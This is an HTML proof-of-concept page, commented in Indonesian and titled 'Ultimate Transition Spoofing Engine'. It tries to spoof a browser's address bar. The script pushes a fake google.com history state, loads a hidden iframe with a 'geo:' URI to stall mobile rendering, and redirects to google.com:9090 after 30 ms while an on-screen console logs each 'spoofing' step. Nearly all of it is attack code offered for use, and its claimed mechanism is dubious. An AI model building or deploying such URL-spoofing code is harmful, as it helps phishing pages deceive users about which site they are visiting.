<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Transition Spoofing Engine</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #00ff66;
            font-family: monospace;
            overflow: hidden;
        }
        #blackout-portal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #000000;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .console {
            border: 1px solid #00ff66;
            padding: 24px;
            border-radius: 6px;
            max-width: 500px;
            width: 85%;
            background: #050505;
            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);
        }
        h3 {
            margin-top: 0;
            color: #ff3366;
            border-bottom: 1px solid #00ff66;
            padding-bottom: 8px;
            font-size: 16px;
        }
        .log-line {
            font-size: 12px;
            margin: 6px 0;
            line-height: 1.4;
        }
        .highlight { color: #38bdf8; }
        .spoof { color: #facc15; }
    </style>
</head>
<body>

    <div id="blackout-portal">
        <div class="console">
            <h3>[!] Transition Spoofing Active</h3>
            <div id="status-container">
                <div class="log-line">> Mengunci state transisi omnibox...</div>
            </div>
        </div>
    </div>

    <script>
        const statusContainer = document.getElementById('status-container');

        function addLog(text, type = '') {
            const div = document.createElement('div');
            div.className = `log-line ${type}`;
            div.innerHTML = `> ${text}`;
            statusContainer.appendChild(div);
        }

        try {
            // 1. Double History State Lock untuk memicu jeda render visual pada indikator URL
            history.pushState({transition: true}, "", "https://www.google.com");
            history.replaceState({transition: true}, "", "https://www.google.com");
            addLog("State transisi disuntikkan: <span class='highlight'>https://www.google.com</span>", "spoof");

            // 2. Memicu iframe non-HTTP untuk menahan *render buffer* seluler
            const frame = document.createElement('iframe');
            frame.style.display = 'none';
            frame.src = "geo:0,0?q=transition_lock";
            document.body.appendChild(frame);
            addLog("Subframe non-HTTP dilepaskan untuk menahan buffer.");

            // 3. Forced Port Swapping saat transisi indikator berjalan
            // Mengalihkan langsung ke port target sebelum render DOM selesai sepenuhnya
            setTimeout(() => {
                addLog("Memaksa swap port ke :9090...", "spoof");
                window.location.replace("https://www.google.com:9090");
            }, 30); // Jeda sangat singkat (30ms) untuk menangkap momen transisi loading awal

        } catch (err) {
            addLog(`Error Transisi: ${err.message}`, "highlight");
            window.location.href = "https://www.google.com:9090";
        }
    </script>
</body>
</html>
